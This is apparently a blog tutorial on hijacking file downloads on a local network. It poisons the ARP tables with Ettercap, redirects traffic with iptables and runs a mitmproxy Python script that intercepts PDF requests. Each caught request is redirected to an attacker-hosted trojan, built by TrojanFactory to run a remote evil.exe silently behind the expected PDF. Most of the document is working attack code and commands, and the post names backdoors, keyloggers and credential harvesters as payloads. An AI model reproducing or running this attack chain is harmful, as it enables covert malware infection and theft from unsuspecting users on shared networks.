---
layout: post
title:  How to Write MITM Scripts Using Python and Executing it With MITMproxy
date:   2019-02-10
category: computer_science
---

For this project we will analyze the flow of data and write our own script to intercept downloaded files and make a trojan out of the file that the target client is downloading.

Here, we are not replacing the file but we are actually giving the target client the file that they requested. However, the requested file will be modified slightly so that when it is executed it will show the target client the file that they expected, while also running our evil file (trojan) in the background. We will write a MITMproxy script to accomplish this file modification. ([Clicke here to read more on MITMproxy.](https://docs.mitmproxy.org/stable/))

The following documentation is based on a post connection attack. Meaning, after connecting to a network the below method can be used to become the MITM (Man In The Middle) between the gateway and the client. I will presume you have a wireless adapter that supports monitor mode and packet injection with Kali Linux installed (or other penetration testing OS installed). Yayy! Now let's move on to the main course of this documentation.

**Writing Python Script To Execute On A Remote Computer**
1. In this documentation I will go through the process of writing scripts in python. These scripts will be used with MITMproxy to be executed on a remote computer. MITMproxy has a scripting API, where python code can be used to interact with MITMproxy. First, we will start off by creating a new python file in the root directory called proxyscript.py
    ```shell
    touch proxyscript.py
    ```

2. We will write the following code in the proxyscript.py file using any text editor.
    ```python
    import mitmproxy

    def request(flow):
        #code to handle request flows

    def response(flow):
        #code to handle response flows
    ```
Note: In the above script the parameter flow is a container that contains/stores all the requests that are being sent from the target and that same parameter is used to contain/store all the responses that are being sent to the target.

3. We will run MITMproxy and tell it to use our python script to handle the flows. So first we will go to our MITM proxy directory in terminal and run mitmdump as shown below.
    ```shell
    ./mitmdump -s /root/proxyscript.py
    ```
Note: In the above command -s is the option to specify the location of our written script to handle flows.

4. So we will intercept the request and create our own response while ARP poisoning one way. We will code the request method in a way that will be able to differentiate the request flow which contains the downloaded file from all the other request flows. Hence, we can avoid creating responses for each request flow and only create a specific response to the flow which contains the downloaded file. In order to this, we will modify our code to make it print only the URL which contains the .pdf extension since we are targeting pdf download request files.
    ```python
    import mitmproxy

    def request(flow):
        #code to handle request flows
        if flow.request.pretty_url.endswith(".pdf"):
            print("[+] Got an intriguing flow")
            print(flow)
    ```
Note: here we print out the pretty_url of the request property of the flow object. The pretty_url will filter out all the request URL's and since we are tageting .pdf files, we can include a conditional if statement as shown above. If client downloads a .pdf file, the print statement should get executed on your terminal in grey colored text.

5. Next, we will generate custom HTTP responses. Our goal is to generate our own response so whenever the target client sends a request that ends with a .pdf we want to be able to generate a response that will get the client to download a fake file. Here, we can serve the client a trojan, a backdoor or rather any file that you want. We will use a method from MITMproxy library to accomplish this.
    ```python
    import mitmproxy

    def request(flow):
        #code to handle request flows
        if flow.request.pretty_url.endswith(".pdf"):
            print("[+] Got an intriguing flow")
            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.232.5/file.zip"})
    ```
Note: the make method takes 3 arguments, the first argument is http status code, second is content, and third is headers. Here, we use status code 301 which is "moved permanently", refer this [link](https://en.wikipedia.org/wiki/HTTP_301) for more info. I set the header name to the location of the fake file. Here, in order to replace the target file response with the fake file response, I provide a direct URL to the fake file and it is stored in my own web server. If you notice we did not modify the second parameter (content) because we are redirecting the user to a different location.

6. Next, we will add another additional condition to the if statement to prevent the code from going into a infinite loop due to the .pdf extension. Since our fake file ends with .pdf as well. so replace the if statement as shown below.
    ```python
    import mitmproxy

    def request(flow):
        #code to handle request flows
        if flow.request.host != "10.15.232.5" and flow.request.pretty_url.endswith(".pdf"):
            print("[+] Got an intriguing flow")
            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.232.5/file.zip"})
    ```
Note: here the host is the IP address or domain name of where my web server is hosted.

7. So now when client clicks on a PDF file to be downloaded, that download request will be redirected to our fake file. This fake file is what will be downloaded to the clients machine.

**Generating Trojans Using TrojanFactory**
1. We will use the [TrojanFactory](https://github.com/z00z/TrojanFactory) application from GitHub to create a trojan and since it uses AutoIt, we will first install [AutoIt from the main web page](https://www.autoitscript.com/site/autoit/downloads/). The AutoIt download comes as a Windows .exe file, hence we will use the Wine tool to run the .exe on Linux terminal as shown below.
    ```shell
    wine autoit-v3-setup.exe
    ```
Note : if you don't have wine installed on Linux, run the following command in terminal "dpkg --add-architecture i386 && apt-get update && apt-get install wine32"

2. Next, we will Clone TrojanFactory to our "opt" directory in the linux machine as shown below.
    ```shell
    git clone https://github.com/z00z/TrojanFactory.git
    ```
Note: to run TrojanFactory, go to the cloned folder and type in "python trojan_factory.py"

3. In order create a trojan... TrojanFactory will do the following for us:
* Combine our evil file with a normal file(pdf, video, image, etc).
* Configure evil file to run silently in the background.
* Change the file icon.
The only thing we need to do is change the file extension... which I will cover later in this documentation

4. We will start off by running TrojanFactory. Along with the command, we will specify the location of the file that we will display for the target client. (For this documentation I will use a adobe acrobat reader readme PDF file as the normal file since it is conveniently stored on the internet and has a *direct URL* to the file. Also, I will host my evil file on my web server so TrojanFactory can combine it with the normal file.)
    ```shell
    python trojan_factory.py -f https://pubs.usgs.gov/dds/dds-057/ReadMe.pdf -e http://10.15.232.5/evil.exe -o /var/www/html/ReadResult.exe -i /root/Downloads/pdf.ico -z
    ```
Note: here -f to specify the location of normal file, -e is to specify the location of evil file, -o is the location to store the result, -i is the location of the Trojan icon that is to be used, here I am using a PDF icon since the target download extension is a PDF. and -z to zip the file. Type in "python trojan_factory.py --help" for more info.

**Executing Bash Commands and Calling TrojanFactory From Our Script.**
1. We will write the following code in the proxyscript.py file using any text editor. In this script, we will call TrojanFactory (execute a bash command in the py script) to generate a trojan and then we will serve that trojan with the expected response to the client. In the below script we are intercepting PDF file. Feel free to intercept any file(.jpg, .exe, etc.) you want by changing the endswith extension. If you do change the extension, make sure to change the -i file to specify an icon that corresponds to the front_file extension.
    ```python
    import mitmproxy
    import subprocess

    def request(flow):
        #code to handle request flows
        if flow.request.host != "10.15.232.5" and flow.request.pretty_url.endswith(".pdf"):
            print("[+] Got an intriguing flow")

            front_file = flow.request.pretty_url + "#"

            subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.15.232.5/evil.exe -o /var/www/html/file.exe# -i /root/Downloads/pdf.ico", shell=True)

            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.232.5/file.zip"})
    ```
Note: I am using subprocess.call to run a bash command, here, I am appending the full path to TrojanFactory since I am trying to access it outside the directory. -f is the front file that will be displayed to the user (in this I am creating a variable, storing the value of the file that the user downloads in that variable, and then I am using that variable for -f). Hence, I have created the variable called front_file and thats going to be equal to the file that the user is downloading. -e is the evil file which is stored in my /var/www/html. -o is the location to store the result, -i is the location of the Trojan icon that is to be used. If you look closely, I am using a hash sign for -f and -e file so that it does not get intercepted in the if condition and the code does not get stuck in a loop.

**Testing Script On A Remote Computer To Replace Downloads With a Trojan.**
1. Now that we know how to create trojans and we have a working script that will replace downloads on the fly with any file that we want, lets test this script against a remote computer. We will start by running an ARP spoofing attack against the client computer using Ettercap. (Note: we can use MTIMproxy whenever we are the man in the middle, hence it can be used with ARP spoofing attack, with Fake AP or rather with any other scenario. For convenience, we will use Ettercap to become the man in the middle.)
    ```shell
    ettercap -Tq -M arp:oneway -i wlan0 -S /10.15.232.1// /10.15.232.9//
    ```
(Note: the above command will silently execute an ARP poison attack using the interface wlan0 and the -S is so that it does not forge an SSL certificate.)

2. Next, we will run MITMproxy in a separate terminal window. So, first go into the working directory of MITMproxy and run the following.
    ```shell
    ./mitmdump -s /root/proxyscript.py --transparent
    ```
(Note: since browser is not configured to run a proxy, we are going to use the transparent mode. Here -s is the location of my MITM python script.)

3. Next, we have to run an iptables command in a separate terminal window to redirect all data to port 8080 where MITMproxy is running, since all the client data is flowing to port 80 (which is my default web server port).
    ```shell
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
    ```

4. So now when a client clicks on a pdf download, the download will get redirected and it will prompt the client to download our evil zip file. When the client unzips and opens the PDF, our evil file will get executed. (This evil file could be a backdoor, a key logger, a credential harvester, etc.)
